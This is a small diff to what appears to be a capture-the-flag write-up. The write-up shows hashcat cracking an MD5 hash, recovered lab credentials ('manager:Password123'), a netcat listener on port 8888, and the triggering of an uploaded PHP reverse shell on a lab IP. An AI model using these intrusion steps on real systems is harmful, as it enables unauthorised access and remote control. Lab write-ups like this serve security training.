@@ -52,6 +52,7 @@ $ hashcat -m 0 -o crack.txt '42f749ade7f9e195bf475f37a44cafcb' /usr/share/wordli
 ```
 
 Loot:
+
 manager:Password123
 
 test creds to http://10.10.160.79/content/as/
@@ -78,7 +79,7 @@ open nc session
 nc -lnvp 8888
 ```
 
-open link 10.10.160.79/content/attachment/php-reverse-shel.php5
+open link http://10.10.160.79/content/attachment/php-reverse-shel.php5
 
 
 ## Lateral Movement:
